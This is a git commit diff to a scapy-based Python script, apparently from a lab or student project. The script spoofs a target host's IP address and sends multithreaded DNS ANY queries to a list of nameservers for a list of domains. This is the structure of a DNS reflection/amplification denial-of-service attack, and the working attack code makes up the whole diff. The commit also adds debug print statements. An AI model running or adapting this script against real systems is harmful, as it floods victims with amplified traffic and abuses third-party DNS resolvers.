2bc5ad63ba59041324474ad9fdd34e7d63f5c4d4
Lucas-Bur <49995094+Lucas-Bur@users.noreply.github.com>
2023-05-30 15:11:18 +0200

    made changes

--- scripts/base_script.py
+++ scripts/base_script.py
@@ -7,11 +7,11 @@ from scapy.all import *
 from scapy.layers.dns import DNS, DNSQR
 from scapy.layers.inet import UDP, IP
 
-target = "172.20.0.6"  # Target host
-nameserver = "172.20.0.2"  # DNS server
-domain = "google.com"  # Some domain name like "google.com" etc.
+target = '172.29.0.3'  # Target host
+# nameserver = "172.20.0.2"  # DNS server
+# domain = "google.com"  # Some domain name like "google.com" etc.
 
-request_count = 10  # times of request
+# request_count = 10  # times of request
 
 
 def filereader(file):
@@ -20,38 +20,42 @@ def filereader(file):
         data = file_list.split()
     return data
 
-
 domains = filereader('DOMAINS.txt')
 nameservers = filereader('SERVERS.txt')
 
-
-def build(domain: string, nameserver: string):
+def build(domain, nameserver):
     ip = IP(src=target, dst=nameserver)
     udp = UDP(dport=53)
     dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))
-    request = (ip / udp / dns)
+    print(type(dns))
+    request = (ip/udp/dns)
+    print('LOG2', request, dns, type(request))
     return request
 
 
-def thread_function(name):
-    for j in domains:
-        print(j)
-        send(build(domain, nameserver))
+def thread_function(nameserver):
+    for domain in domains:
+        print(f"LOG: ", domain, nameserver)
+        request = build(domain, nameserver)
+        print('LOG3:', request)
+        send(request)
 
 
 if __name__ == "__main__":
-    format = "%(asctime)s: %(message)s"
-    logging.basicConfig(format=format, level=logging.INFO,
-                        datefmt="%H:%M:%S")
+    # format = "%(asctime)s: %(message)s"
+    # logging.basicConfig(format=format, level=logging.INFO,
+    #                     datefmt="%H:%M:%S")
+
+
 
     threads = list()
-    for index in range(10):
-        logging.info("Main    : create and start thread %d.", index)
-        x = threading.Thread(target=thread_function, args=(index,))
+    for nameserver in nameservers:
+        # logging.info("Main    : create and start thread %d.", nameserver)
+        x = threading.Thread(target=thread_function, args=(nameserver,))
         threads.append(x)
         x.start()
 
     for index, thread in enumerate(threads):
-        logging.info("Main    : before joining thread %d.", index)
+        # logging.info("Main    : before joining thread %d.", index)
         thread.join()
-        logging.info("Main    : thread %d done", index)
+        # logging.info("Main    : thread %d done", index)
